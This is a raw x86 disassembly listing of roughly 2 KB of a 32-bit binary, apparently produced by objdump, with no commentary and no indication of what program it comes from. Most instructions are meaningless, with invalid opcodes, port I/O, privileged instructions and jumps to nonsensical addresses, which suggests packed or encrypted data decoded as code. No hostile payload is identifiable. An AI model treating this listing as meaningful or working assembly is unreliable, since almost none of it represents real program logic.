  41fc8a:	and    DWORD PTR [edx-0x718ed7fd],esp
  41fc90:	cld    
  41fc91:	nop
  41fc92:	mov    BYTE PTR [esi],0x21
  41fc95:	in     eax,dx
  41fc96:	add    ebx,DWORD PTR [ecx]
  41fc98:	(bad)  
  41fc99:	fisttp DWORD PTR [esi-0x4a]
  41fc9c:	mov    WORD PTR [edx+eax*2-0x3f5059fb],es
  41fca3:	add    eax,0x679c4619
  41fca8:	dec    edx
  41fca9:	and    eax,0x2d1370fe
  41fcae:	dec    esi
  41fcaf:	mov    eax,0x96129179
  41fcb4:	icebp  
  41fcb5:	popa   
  41fcb6:	loopne 0x41fc45
  41fcb8:	mov    ebp,0x7622c348
  41fcbd:	push   ds
  41fcbe:	imul   esi,ecx,0x41
  41fcc1:	shl    BYTE PTR [edx-0x4eaaa7aa],1
  41fcc7:	scas   al,BYTE PTR es:[edi]
  41fcc8:	xchg   edx,eax
  41fcc9:	adc    bl,0x58
  41fccc:	add    bh,BYTE PTR [eax+0x7b]
  41fccf:	es or  eax,0x18eb755c
  41fcd5:	stos   BYTE PTR es:[edi],al
  41fcd6:	xor    dh,bh
  41fcd8:	xor    eax,0x45443b2c
  41fcdd:	xor    BYTE PTR [edx],dh
  41fcdf:	mov    cl,0x17
  41fce1:	fcom   DWORD PTR [eax-0x6e2fe252]
  41fce7:	stos   BYTE PTR es:[edi],al
  41fce8:	xchg   esi,eax
  41fce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcea:	out    dx,eax
  41fceb:	dec    ebp
  41fcec:	jno    0x41fcc8
  41fcee:	jb     0x41fc77
  41fcf0:	adc    al,0xe8
  41fcf2:	push   0xffffffab
  41fcf4:	sub    BYTE PTR [ebx-0x37af5d24],ah
  41fcfa:	push   ss
  41fcfb:	jns    0x41fd36
  41fcfd:	sub    bl,BYTE PTR [ebx+edi*8]
  41fd00:	cli    
  41fd01:	xchg   ebx,eax
  41fd02:	or     esi,DWORD PTR [edi-0x66]
  41fd05:	repnz mov al,0xb6
  41fd08:	xor    eax,0xe0db131
  41fd0d:	inc    edx
  41fd0e:	shl    DWORD PTR [esi-0x7aa365be],0xbb
  41fd15:	ins    DWORD PTR es:[edi],dx
  41fd16:	scas   eax,DWORD PTR es:[edi]
  41fd17:	mov    bh,0x19
  41fd19:	(bad)
  41fd1d:	repnz xor eax,0xfaac249f
  41fd23:	ror    DWORD PTR [ebp-0x208777db],0x91
  41fd2a:	sbb    dl,BYTE PTR [esi-0x7c952166]
  41fd30:	leave  
  41fd31:	test   DWORD PTR [edx],eax
  41fd33:	inc    ecx
  41fd34:	popa   
  41fd35:	adc    ebx,DWORD PTR [edx-0x6d0982f3]
  41fd3b:	jmp    0xe5c193fa
  41fd40:	call   0xd6c35926
  41fd45:	cmp    bl,cl
  41fd47:	xchg   ebp,eax
  41fd48:	into   
  41fd49:	dec    esp
  41fd4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd4b:	nop
  41fd4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd4d:	fs push ebx
  41fd4f:	dec    esp
  41fd50:	xchg   BYTE PTR gs:[eax],dl
  41fd53:	jmp    DWORD PTR [edi+0x4e]
  41fd56:	cmp    al,BYTE PTR [esi+ebx*2-0x64]
  41fd5a:	add    eax,0x75354a00
  41fd5f:	fisubr DWORD PTR [ecx-0x20255fec]
  41fd65:	jg     0x41fd18
  41fd67:	cmp    eax,0x8024aaba
  41fd6c:	lea    ebx,[ebx+0xece3630]
  41fd72:	in     al,0xeb
  41fd74:	inc    esp
  41fd75:	adc    BYTE PTR [esi-0x7e3a457],0xa9
  41fd7c:	call   0x8379b013
  41fd81:	push   ebx
  41fd82:	cmp    DWORD PTR [edi+0x69],eax
  41fd85:	lods   al,BYTE PTR ds:[esi]
  41fd86:	mov    ebx,0xe38cfb7a
  41fd8c:	pop    ss
  41fd8d:	ins    BYTE PTR es:[edi],dx
  41fd8e:	pop    es
  41fd8f:	mov    dl,0x8b
  41fd91:	nop
  41fd92:	inc    eax
  41fd93:	pop    ds
  41fd94:	das    
  41fd95:	xor    BYTE PTR [esi-0x6f],0xa8
  41fd99:	and    DWORD PTR [edi],ecx
  41fd9b:	pop    esi
  41fd9c:	enter  0xa258,0x77
  41fda0:	push   es
  41fda1:	pop    es
  41fda2:	dec    esi
  41fda3:	jle    0x41fd67
  41fda5:	in     al,dx
  41fda6:	scas   eax,DWORD PTR es:[edi]
  41fda7:	sbb    al,0xfb
  41fda9:	push   0x5
  41fdab:	fcmovnbe st,st(3)
  41fdad:	rcr    ah,0xa9
  41fdb0:	or     ecx,ebx
  41fdb2:	inc    ecx
  41fdb3:	ins    DWORD PTR es:[edi],dx
  41fdb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdb5:	retf   
  41fdb6:	lock fcomp QWORD PTR [edi+0x6f]
  41fdba:	cs in  eax,0x41
  41fdbd:	fld    DWORD PTR [ecx-0x515d3d1a]
  41fdc3:	stos   BYTE PTR es:[edi],al
  41fdc4:	mov    ds,ebx
  41fdc6:	icebp  
  41fdc7:	and    al,0x8e
  41fdc9:	mov    dl,0xcd
  41fdcb:	sbb    edi,DWORD PTR [esi+0x69]
  41fdce:	dec    ebp
  41fdcf:	push   ebx
  41fdd0:	popf   
  41fdd1:	fidiv  WORD PTR [edx]
  41fdd3:	mov    esi,0x94595a98
  41fdd8:	imul   esi,DWORD PTR [eax+ebp*8-0x7e],0x8452ed55
  41fde0:	jnp    0x41fe2a
  41fde2:	loope  0x41fe08
  41fde4:	mov    esi,DWORD PTR [ebx+0x41e7345]
  41fdea:	lahf   
  41fdeb:	mov    ah,0xc7
  41fded:	js     0x41fe31
  41fdef:	pop    edx
  41fdf0:	popa   
  41fdf1:	in     al,dx
  41fdf2:	or     dl,BYTE PTR [ebp+0x529b112b]
  41fdf8:	out    0xde,eax
  41fdfa:	ret    0x7d39
  41fdfd:	clc    
  41fdfe:	mov    ds:0x210ab205,eax
  41fe03:	daa    
  41fe04:	cmp    ebp,ebx
  41fe06:	mov    BYTE PTR [esi-0x412cb074],dh
  41fe0c:	mov    dl,0xa7
  41fe0e:	repz dec eax
  41fe10:	ds jp  0x41fe8e
  41fe13:	and    eax,0xbca9b2a2
  41fe18:	dec    ebp
  41fe19:	inc    esp
  41fe1a:	dec    edx
  41fe1b:	jle    0x41fdcb
  41fe1d:	data16 (bad) 
  41fe1f:	jns    0x41fe45
  41fe21:	mov    BYTE PTR [edi],cl
  41fe23:	ss xchg esp,eax
  41fe25:	call   FWORD PTR [esi+0x66]
  41fe28:	push   ecx
  41fe29:	cmp    ecx,esp
  41fe2b:	sub    edx,DWORD PTR [edi+0x6200bbd2]
  41fe31:	aas    
  41fe32:	adc    eax,0x5bd035a9
  41fe37:	mov    esi,0xde7b10d0
  41fe3c:	and    DWORD PTR [edx+0x7af3f476],ebp
  41fe42:	cs sbb edx,ecx
  41fe45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe46:	fild   QWORD PTR ds:0x8112fb4f
  41fe4c:	cmp    BYTE PTR [ebx+0xa],dh
  41fe4f:	xchg   edx,eax
  41fe50:	shl    BYTE PTR [ebx-0x53],1
  41fe53:	xchg   edi,eax
  41fe54:	xchg   edi,eax
  41fe55:	cdq    
  41fe56:	aad    0xba
  41fe58:	sbb    ah,bl
  41fe5a:	xor    al,0xb8
  41fe5c:	fcomp  DWORD PTR [eax-0x44883af3]
  41fe62:	stos   DWORD PTR es:[edi],eax
  41fe63:	lea    esi,[edi]
  41fe65:	inc    edi
  41fe66:	or     BYTE PTR [esp+ebp*1-0x531adb0a],0x21
  41fe6e:	iret   
  41fe6f:	push   ebx
  41fe70:	rol    DWORD PTR [edx],0x60
  41fe73:	push   edi
  41fe74:	pop    ebp
  41fe75:	out    0xc0,al
  41fe77:	adc    al,0x83
  41fe79:	mov    DWORD PTR [ebx-0x2c994e46],edx
  41fe7f:	lods   al,BYTE PTR ds:[esi]
  41fe80:	jmp    0xc8e2:0x9ba88a5f
  41fe87:	lods   al,BYTE PTR ds:[esi]
  41fe88:	lea    ebp,[eax+0x1b68898]
  41fe8e:	xor    eax,esi
  41fe90:	mov    WORD PTR [esi],ss
  41fe92:	clc    
  41fe93:	jecxz  0x41fec5
  41fe95:	mov    ds:0xcc8052dc,eax
  41fe9a:	mov    eax,0x9a2ca3b4
  41fe9f:	xor    eax,0xf26ebf11
  41fea4:	loope  0x41fe2e
  41fea6:	pop    ecx
  41fea7:	mov    ecx,0xd515d101
  41feac:	sti    
  41fead:	leave  
  41feae:	pop    edx
  41feaf:	pop    ecx
  41feb0:	dec    ecx
  41feb1:	jmp    0xbf0b9a61
  41feb6:	sbb    BYTE PTR [eax],dh
  41feb8:	ja     0x41fe54
  41feba:	pop    esp
  41febb:	(bad)  
  41febc:	push   ecx
  41febe:	inc    edx
  41febf:	nop
  41fec0:	xor    dl,bh
  41fec2:	stc    
  41fec3:	(bad)  
  41fec4:	leave  
  41fec5:	leave  
  41fec6:	ret    0xf43a
  41fec9:	cmp    al,0x53
  41fecb:	cmp    BYTE PTR [ecx-0x2f],cl
  41fece:	in     al,0xe4
  41fed0:	std    
  41fed1:	cmp    al,0x25
  41fed3:	sbb    al,0x23
  41fed5:	fmul   DWORD PTR [esi+0x1fdb6a5c]
  41fedb:	aaa    
  41fedc:	stos   BYTE PTR es:[edi],al
  41fedd:	xor    DWORD PTR [edx-0x5d],eax
  41fee0:	add    dl,BYTE PTR [esi+0x47b2b2a1]
  41fee6:	ret    
  41fee7:	mov    eax,0x6c9f659f
  41feec:	and    al,0x66
  41feee:	add    esp,esp
  41fef0:	xor    BYTE PTR [esi-0x7e],dh
  41fef3:	dec    esi
  41fef4:	scas   al,BYTE PTR es:[edi]
  41fef5:	adc    esi,DWORD PTR [ebp-0xf]
  41fef8:	in     al,dx
  41fef9:	shl    ah,cl
  41fefb:	popf   
  41fefc:	leave  
  41fefd:	es dec edi
  41feff:	add    ecx,0x3dfe35e7
  41ff05:	div    DWORD PTR [ebx]
  41ff07:	cmp    DWORD PTR [edx-0xcf820ed],edx
  41ff0d:	dec    ebx
  41ff0e:	pop    edx
  41ff0f:	push   ss
  41ff10:	icebp  
  41ff11:	daa    
  41ff12:	sub    ebp,ebx
  41ff14:	mov    ah,0x67
  41ff16:	mov    DWORD PTR [ecx-0x5c689e98],ebx
  41ff1c:	je     0x41fea6
  41ff1e:	mov    WORD PTR [esi+0x5f7e03b2],es
  41ff24:	mov    eax,0x5cb0eef8
  41ff29:	add    BYTE PTR [edx+0x65],ch
  41ff2c:	xchg   esp,eax
  41ff2d:	fwait
  41ff2e:	jne    0x41fee6
  41ff30:	jns    0x41fec5
  41ff32:	pop    edx
  41ff33:	dec    eax
  41ff34:	jo     0x41ff14
  41ff36:	dec    edx
  41ff37:	xchg   edi,eax
  41ff38:	xor    edx,edx
  41ff3a:	push   0x3
  41ff3c:	pop    ecx
  41ff3d:	div    ecx
  41ff3f:	mov    ecx,DWORD PTR [ebp-0x40]
  41ff42:	or     eax,ecx
  41ff44:	mov    ecx,DWORD PTR [ebp-0x54]
  41ff47:	xor    edx,edx
  41ff49:	div    ecx
  41ff4b:	imul   eax,eax,0x7d53
  41ff51:	jmp    0x420338
  41ff56:	xor    DWORD PTR [ebx],edx
  41ff58:	(bad)  
  41ff59:	in     al,dx
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	imul   edi,DWORD PTR [ebx-0x57113e5],0xffffffa4
  41ff62:	mov    ebx,0x63a4fa71
  41ff67:	xchg   ebp,eax
  41ff68:	sar    BYTE PTR [esi-0x41413bb6],0x5f
  41ff6f:	stos   BYTE PTR es:[edi],al
  41ff70:	mov    ebx,0x431fc993
  41ff75:	cdq    
  41ff76:	scas   eax,DWORD PTR es:[edi]
  41ff77:	mov    dl,0x2d
  41ff79:	xchg   ebx,eax
  41ff7a:	inc    esp
  41ff7b:	xor    esi,DWORD PTR [ebx+0x695772fc]
  41ff81:	(bad)  
  41ff82:	inc    esi
  41ff83:	aaa    
  41ff84:	into   
  41ff85:	popa   
  41ff86:	mov    dl,0x2a
  41ff88:	jl     0x41ff1d
  41ff8a:	(bad)  
  41ff8c:	mov    bl,0xd6
  41ff8e:	dec    edx
  41ff8f:	psraw  mm3,QWORD PTR [edi-0x59]
  41ff93:	or     al,0x23
  41ff95:	ds mov ebp,0xb2f3651
  41ff9b:	pop    es
  41ff9c:	ins    BYTE PTR es:[edi],dx
  41ff9d:	fnstsw WORD PTR [ebx-0x3c0bedd7]
  41ffa3:	push   eax
  41ffa4:	sbb    bh,BYTE PTR [edi+0x29150746]
  41ffaa:	mov    ch,0xee
  41ffac:	mov    DWORD PTR [edi],edx
  41ffae:	std    
  41ffaf:	xchg   esp,eax
  41ffb0:	inc    edi
  41ffb1:	dec    eax
  41ffb2:	jo     0x420020
  41ffb4:	(bad)  [esi+0x8]
  41ffb7:	gs in  al,dx
  41ffb9:	cmp    ebp,DWORD PTR [ecx+0x6a]
  41ffbc:	jo     0x42003d
  41ffbe:	das    
  41ffbf:	xchg   ebx,eax
  41ffc0:	jbe    0x41ffcf
  41ffc2:	cmp    DWORD PTR fs:[edx+0x32],esi
  41ffc6:	fstp   TBYTE PTR [esp+eiz*2]
  41ffc9:	mov    edx,0x85425f1e
  41ffce:	cs xchg esp,eax
  41ffd0:	sub    BYTE PTR [edx+0x32b32cf2],bl
  41ffd6:	xlat   BYTE PTR ds:[ebx]
  41ffd7:	jmp    0x7e3c3d46
  41ffdc:	call   0x684708d6
  41ffe1:	imul   esp,ebx,0xe6663f58
  41ffe7:	add    BYTE PTR [edx+0x43731fad],ah
  41ffed:	es addr16 sub dh,al
  41fff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fff2:	pop    es
  41fff3:	fdivp  st(5),st
  41fff5:	aad    0x19
  41fff7:	cli    
  41fff8:	push   esp
  41fff9:	jecxz  0x41ffcd
  41fffb:	jns    0x420018
  41fffd:	fnstenv [ebx-0x67294d04]
  420003:	dec    esi
  420004:	mov    bl,0x74
  420006:	iret   
  420007:	sub    DWORD PTR [ebx-0x2333ee06],esi
  42000d:	psubq  mm6,QWORD PTR [ecx]
  420010:	stos   BYTE PTR es:[edi],al
  420011:	neg    DWORD PTR [ecx-0x15]
  420014:	add    DWORD PTR [ecx+0x54a86ae6],ecx
  42001a:	cli    
  42001b:	test   bl,bl
  42001d:	pusha  
  42001e:	and    BYTE PTR [eax],cl
  420020:	ret    0xf6ba
  420023:	sub    ebp,eax
  420025:	mov    bh,0xba
  420027:	ins    BYTE PTR es:[edi],dx
  420028:	or     DWORD PTR [ebx+0x4],esp
  42002b:	outs   dx,BYTE PTR ds:[esi]
  42002c:	add    DWORD PTR [ecx+0x22],ecx
  42002f:	out    dx,ax
  420031:	pop    ebp
  420032:	sub    edx,ebp
  420034:	jg     0x41ffbc
  420036:	daa    
  420037:	jmp    0xbd7f5610
  42003c:	mov    ebx,0x43e1b06c
  420041:	and    eax,0x9ca49fff
  420046:	sub    ah,0x73
  420049:	inc    ebp
  42004a:	dec    eax
  42004b:	test   al,0xe9
  42004d:	and    ecx,DWORD PTR [edx+0x2d]
  420050:	sub    DWORD PTR [ebx+0xace098c],edi
  420056:	mov    ds:0x6ede28ac,eax
  42005b:	xchg   ecx,eax
  42005c:	sbb    eax,0xda39ca0c
  420061:	rcr    BYTE PTR [ebp-0x13],1
  420064:	retf   0x460d
  420067:	push   ss
  420068:	mov    edi,0x8ab1c0f6
  42006d:	scas   al,BYTE PTR es:[edi]
  42006e:	mov    fs:0x3ed1ae77,al
  420074:	out    dx,eax
  420075:	stos   DWORD PTR es:[edi],eax
  420076:	pop    es
  420077:	and    DWORD PTR [ebx+eax*1+0x14],0x27b77a6
  42007f:	jo     0x420090
  420081:	repz lahf 
  420083:	fwait
  420084:	or     eax,0xa4e548bd
  420089:	inc    ebx
  42008a:	out    0xe9,eax
  42008c:	dec    DWORD PTR [eax+0x1f]
  42008f:	and    al,0x5
  420091:	mov    ecx,0x71aad6ea
  420096:	mov    edi,0xbb8ac484
  42009b:	aas    
  42009c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42009d:	lods   eax,DWORD PTR ds:[esi]
  42009e:	sub    DWORD PTR [ebp+0x72],0x21
  4200a2:	call   0x1618:0xa9f24c0f
  4200a9:	test   DWORD PTR [ebp-0x20de5e52],ebx
  4200af:	(bad)  
  4200b0:	test   DWORD PTR [eax-0x6b],ebp
  4200b3:	shl    BYTE PTR ds:0x3272731c,0x1
  4200ba:	mov    ecx,0xc4f8c8c9
  4200bf:	mov    al,0x6f
  4200c1:	push   eax
  4200c2:	clc    
  4200c3:	inc    esi
  4200c4:	(bad)  
  4200c5:	jge    0x420062
  4200c7:	(bad)  
  4200c8:	into   
  4200c9:	mov    WORD PTR [ebp+0x39],ss
  4200cc:	fstp   QWORD PTR [esi]
  4200ce:	inc    edx
  4200cf:	mov    esp,0x1c279a52
  4200d4:	sub    DWORD PTR [esi+ecx*2-0x15ed05c2],eax
  4200db:	nop
  4200dc:	mov    bh,0x32
  4200de:	pop    eax
  4200df:	xor    dl,bh
  4200e1:	or     ah,BYTE PTR [ebx-0x6]
  4200e4:	mov    cs,WORD PTR [ebx-0x6302f0ee]
  4200ea:	and    BYTE PTR [ecx],dh
  4200ec:	out    dx,eax
  4200ed:	fcomp  QWORD PTR [ebx+eiz*8-0x778bec54]
  4200f4:	mov    cl,0x94
  4200f6:	jp     0x420158
  4200f8:	(bad)  
  4200f9:	pop    ecx
  4200fa:	mov    eax,0x2a6b7b26
  4200ff:	xor    BYTE PTR es:[ecx],ah
  420102:	inc    esi
  420103:	push   ds
  420104:	rol    edx,cl
  420106:	call   0x9aab:0x54f9633c
  42010d:	mov    esi,0x19758cd
  420112:	xlat   BYTE PTR ds:[ebx]
  420113:	mov    esp,0xac0ce535
  420118:	push   ebx
  420119:	icebp  
  42011a:	sahf   
  42011b:	jnp    0x4200e4
  42011d:	ret    
  42011e:	add    esp,ebp
  420120:	sub    BYTE PTR [ecx+0x729bbf],0xe3
  420127:	repnz in al,dx
  420129:	sub    al,0x38
  42012b:	and    DWORD PTR [edx],esi
  42012d:	sbb    bh,BYTE PTR [esi]
  42012f:	es sub al,0x72
  420132:	and    esi,DWORD PTR [edi]
  420134:	and    bl,BYTE PTR [esi]
  420136:	push   ds
  420137:	aad    0x55
  420139:	out    dx,eax
  42013a:	imul   ebp,DWORD PTR [eax+ebx*2+0x42],0xffffffa9
  42013f:	je     0x4200e7
  420141:	out    0xda,eax
  420143:	push   cs
  420144:	dec    ebp
  420145:	cmp    ebp,DWORD PTR [ebp+0x12]
  420148:	les    ebp,FWORD PTR [ebp-0x757b9928]
  42014e:	inc    ebx
  42014f:	mov    ds:0x20db8da7,al
  420154:	(bad)  
  420155:	hlt    
  420156:	sti    
  420157:	or     eax,0x78c84051
  42015c:	cmp    edi,DWORD PTR [eax+0x37b6b04d]
  420162:	scas   al,BYTE PTR es:[edi]
  420163:	xchg   ebx,eax
  420164:	mov    esi,0x1ad76dbd
  420169:	retf   0x9dad
  42016c:	jp     0x4201ad
  42016e:	call   0xe60f:0xdab4a0f4
  420175:	or     DWORD PTR [eax],ebp
  420177:	das    
  420178:	inc    ebx
  420179:	dec    eax
  42017a:	retf   
  42017b:	call   0xd0aaf585
  420180:	ins    BYTE PTR es:[edi],dx
  420181:	ret    0x1f9e
  420184:	repnz cmc 
  420186:	fisttp DWORD PTR [eax+0x202de950]
  42018c:	pusha  
  42018d:	xor    BYTE PTR [ebx-0x430d27a2],ah
  420193:	pop    ebp
  420194:	fwait
  420195:	and    al,0x80
  420197:	das    
  420198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420199:	and    DWORD PTR ds:0x682fba62,esi
  42019f:	mov    ebx,0x64c290c2
  4201a4:	inc    ecx
  4201a5:	cmp    edx,DWORD PTR [ecx-0xc2a960a]
  4201ab:	fadd   DWORD PTR ds:0xb3988a4b
  4201b1:	test   eax,0x5cd30020
  4201b6:	push   edi
  4201b7:	push   bx
  4201b9:	repz mov dh,0xd
  4201bc:	pop    ecx
  4201bd:	dec    edx
  4201be:	xor    ebp,eax
  4201c0:	pushf  
  4201c1:	in     eax,dx
  4201c2:	mov    eax,ds:0xd597d9f8
  4201c7:	push   0xb8432fa5
  4201cc:	pop    eax
  4201cd:	cmp    dl,BYTE PTR [esi+0x34c778dd]
  4201d3:	jp     0x420251
  4201d5:	inc    esi
  4201d6:	popf   
  4201d7:	inc    eax
  4201d8:	xor    esp,DWORD PTR [ebx-0x58d06ebd]
  4201de:	ret    0x9fde
  4201e1:	ja     0x420243
  4201e3:	fstp   DWORD PTR [ebp-0x4f]
  4201e6:	cs pusha 
  4201e8:	jne    0x4201b0
  4201ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201eb:	mov    esp,0xcc5b9e4a
  4201f0:	dec    ebx
  4201f1:	cmp    al,0xa4
  4201f3:	in     eax,0x64
  4201f5:	outs   dx,BYTE PTR ds:[esi]
  4201f6:	sbb    BYTE PTR [eax+edx*2-0x7416def4],ch
  4201fd:	outs   dx,DWORD PTR ds:[esi]
  4201fe:	jge    0x420222
  420200:	and    dl,ch
  420202:	adc    DWORD PTR [edx+0x39a9770c],ebp
  420208:	mov    ebp,0xf86a0d3b
  42020d:	sbb    DWORD PTR [ebp-0x6a],ebp
  420210:	repz in al,0xe5
  420213:	xlat   BYTE PTR ds:[ebx]
  420214:	ficomp DWORD PTR [edi]
  420216:	mov    al,0x23
  420218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420219:	jnp    0x42024f
  42021b:	mov    eax,0x6ffb2e6f
  420221:	test   al,0xbf
  420223:	icebp  
  420224:	mov    fs,eax
  420226:	cmp    ebx,DWORD PTR [eax-0x5da91f6f]
  42022c:	call   DWORD PTR [eax]
  42022e:	in     eax,dx
  42022f:	rol    BYTE PTR [ebx+0x73],cl
  420232:	xor    edi,DWORD PTR [ecx]
  420234:	xchg   edx,eax
  420235:	rol    esp,0xae
  420238:	adc    DWORD PTR [edi+eax*8-0x4488350],0xeb29620b
  420243:	xchg   esp,eax
  420244:	in     al,dx
  420245:	jl     0x4201cc
  420247:	ret    0x5946
  42024a:	icebp  
  42024b:	xchg   esi,eax
  42024c:	push   edi
  42024d:	clc    
  42024e:	mov    al,ds:0x9beb94ba
  420253:	loop   0x42021a
  420255:	cmc    
  420256:	dec    edx
  420257:	in     al,dx
  420258:	mov    ds:0x9a90d2a7,al
  42025d:	adc    eax,0x8f6e9e46
  420262:	mov    esi,DWORD PTR [eax+edi*4]
  420265:	ror    al,cl
  420267:	fiadd  DWORD PTR [ecx+0x59ccaa39]
  42026d:	mov    cs,WORD PTR [ecx+eax*8+0x165f200a]
  420274:	sbb    ebx,DWORD PTR [ecx-0x4b302ab4]
  42027a:	fcomp  QWORD PTR [edi+0xaa9f373]
  420280:	adc    BYTE PTR [esp+ebx*4+0x1ed53c6],0x15
  420288:	test   eax,0x4ea27143
  42028d:	(bad)  
  42028e:	icebp  
  42028f:	pushf  
  420290:	adc    BYTE PTR [ecx-0x43],cl
  420293:	ror    DWORD PTR [edi-0x7c],1
  420296:	sbb    eax,0x3e263625
  42029b:	ins    BYTE PTR es:[edi],dx
  42029c:	fld    QWORD PTR [ecx]
  42029e:	jmp    0x957588c2
  4202a3:	loope  0x420248
  4202a5:	push   eax
  4202a6:	or     eax,0xaf53f776
  4202ab:	adc    BYTE PTR [esi+edx*4-0x59],0x27
  4202b0:	xor    cl,BYTE PTR [eax-0xe]
  4202b3:	inc    ebp
  4202b4:	mov    dh,0x2c
  4202b6:	hlt    
  4202b7:	lock jecxz 0x420264
  4202ba:	add    ebp,DWORD PTR [eax-0x23]
  4202bd:	xchg   esp,eax
  4202be:	cld    
  4202bf:	test   dh,dh
  4202c1:	add    eax,0xa57a2cb2
  4202c6:	cld    
  4202c7:	aaa    
  4202c8:	repz loop 0x4202a1
  4202cb:	shr    DWORD PTR [esi+0x21e5e4b0],cl
  4202d1:	xchg   edi,eax
  4202d2:	popf   
  4202d3:	loop   0x42027c
  4202d5:	test   DWORD PTR [ecx-0x5d84f82f],eax
  4202db:	jp     0x420293
  4202dd:	das    
  4202de:	fistp  QWORD PTR [ebx]
  4202e0:	sar    DWORD PTR [edx],1
  4202e2:	test   eax,0xc7156966
  4202e7:	jg     0x4202d4
  4202e9:	sbb    al,0x23
  4202eb:	daa    
  4202ec:	fsub   DWORD PTR [ebx+0xb]
  4202ef:	cmp    eax,0x32bb3e3f
  4202f4:	fnstsw WORD PTR [ebx-0x719a6b51]
  4202fa:	xor    bl,BYTE PTR [edi]
  4202fc:	stos   DWORD PTR es:[edi],eax
  4202fd:	mov    ebp,0xc4c2bcfc
  420302:	mov    edx,esi
  420304:	sahf   
  420305:	outs   dx,DWORD PTR ds:[esi]
  420306:	inc    ebp
  420307:	mov    ah,BYTE PTR [ecx-0x7847be63]
  42030d:	push   cs
  42030e:	push   edi
  42030f:	mov    ecx,0x1b315653
  420314:	es (bad) 
  420316:	fxch   st(7)
  420318:	dec    ecx
  420319:	aaa    
  42031a:	mov    esp,DWORD PTR [edi-0x5ffad7c9]
  420320:	push   ds
  420321:	push   0xffffffc6
  420323:	cdq    
  420324:	push   edi
  420325:	sar    esp,1
  420327:	ja     0x42037d
  420329:	div    BYTE PTR [edx-0x16]
  42032c:	arpl   WORD PTR [ecx],dx
  42032e:	mov    al,ds:0xd914756f
  420333:	(bad)  
  420334:	mov    al,ds:0x8b06491a
  420339:	dec    ebp
  42033a:	or     BYTE PTR [ebp-0x4806fe7c],cl
  420340:	lods   al,BYTE PTR ds:[esi]
  420341:	loopne 0x4202ce
  420343:	lea    edx,[eax]
  420345:	(bad)  
  420346:	(bad)  
  420347:	inc    DWORD PTR [ecx+0x4108e1]
  42034d:	add    BYTE PTR [ecx+0x40e7e1],al
  420353:	add    BYTE PTR [ecx+0x1a54e9],al
  420359:	add    BYTE PTR [ecx+0x25acf1],al
  42035f:	add    BYTE PTR [ebx-0x1036b],cl
  420365:	(bad)  
  420366:	jmp    0x42074d
  42036b:	pop    eax
  42036c:	dec    ecx
  42036d:	xchg   esi,eax
  42036e:	jmp    0x42030c
  420370:	cmp    al,0xbc
  420372:	jns    0x4203a4
  420374:	inc    edx
  420375:	aad    0xe3
  420377:	mov    eax,0xefd11adb
  42037c:	popf   
  42037d:	sar    BYTE PTR [esi-0x41413bb6],0x6d
  420384:	(bad)  
  420385:	fisttp DWORD PTR ss:[esi]
  420388:	(bad)  
  420389:	adc    al,0x2e
  42038b:	test   DWORD PTR [edi-0x7864a852],0xb88fe35d
  420395:	in     al,dx
  420396:	call   0xbb7a53ee
  42039b:	or     esp,DWORD PTR [ebp+0x7fa098a1]
  4203a1:	or     eax,DWORD PTR [ebp+0x6a3e5ec0]
  4203a7:	mov    ds:0x7f77a238,al
  4203ac:	mov    bl,0x9
  4203ae:	dec    ebp
  4203af:	or     DWORD PTR [esi-0x707650e8],edi
  4203b5:	iret   
  4203b6:	add    ch,BYTE PTR [ebp+0xab21238]
  4203bc:	mov    edx,0xe7804864
  4203c1:	mov    gs:0xa76cbf78,al
  4203c7:	push   edx
  4203c8:	pop    ecx
  4203c9:	or     eax,0xf0169664
  4203ce:	sbb    al,0x9e
  4203d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203d1:	cli    
  4203d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203d3:	test   BYTE PTR [ebp+0x23],al
  4203d6:	cmp    ah,BYTE PTR ds:0xf57bbcfd
  4203dc:	push   edi
  4203dd:	inc    ebx
  4203de:	inc    esi
  4203df:	add    BYTE PTR [ebx+edi*1],ch
  4203e2:	push   ecx
  4203e3:	jbe    0x420407
  4203e5:	mov    dh,0xd7
  4203e7:	stos   DWORD PTR es:[edi],eax
  4203e8:	sub    ecx,DWORD PTR [edi+0x4a468b86]
  4203ee:	sbb    DWORD PTR [ebx+0x116c6a39],ecx
  4203f4:	in     al,0x6d
  4203f6:	test   al,0x75
  4203f8:	pop    ss
  4203f9:	pop    ds
  4203fa:	dec    edx
  4203fb:	jmp    0xd34b676e
  420400:	xchg   esp,eax
  420401:	gs das 
  420403:	adc    esp,DWORD PTR [edi+0x8766eb2]
  420409:	sbb    eax,0x8dd11ffd
  42040e:	xchg   esp,eax
  42040f:	add    esi,esi
  420411:	sub    dl,BYTE PTR fs:[edx+0x3f]
  420415:	in     al,dx
  420416:	sbb    BYTE PTR [ebx-0x987084f],0x9
  42041d:	ret    0x465
  420420:	enter  0xa97d,0x9
  420424:	mov    WORD PTR [ecx-0x36],fs
  420427:	lods   eax,DWORD PTR ds:[esi]
  420428:	dec    ebp
  420429:	mov    dh,0x27
  42042b:	push   ecx
  42042c:	loopne 0x420430
  42042e:	jmp    0xf5a85bc5
  420433:	in     al,dx
  420434:	(bad)  [ecx]
  420436:	cmp    dh,0xc7
  420439:	aaa    
  42043a:	sbb    DWORD PTR [edx],esp
  42043c:	(bad)  
  42043d:	call   0x33bdc997
  420442:	les    esi,FWORD PTR [esp+ebp*1+0x6d738527]
  420449:	adc    DWORD PTR [esi-0xb],ecx
  42044c:	(bad)  
  42044d:	jge    0x4203dc
  42044f:	cmp    eax,0xa861022b
  420454:	sbb    eax,0xdbfb9985
  420459:	adc    edi,DWORD PTR [edi+0x49d0b1a9]
  42045f:	inc    ebp
  420460:	mov    ch,0x7b
  420462:	imul   esi,DWORD PTR [eax+0x1],0xffffff9c
  420466:	fisub  DWORD PTR [esi+ecx*2]
  420469:	test   BYTE PTR [ebx-0x7f8f4693],ah
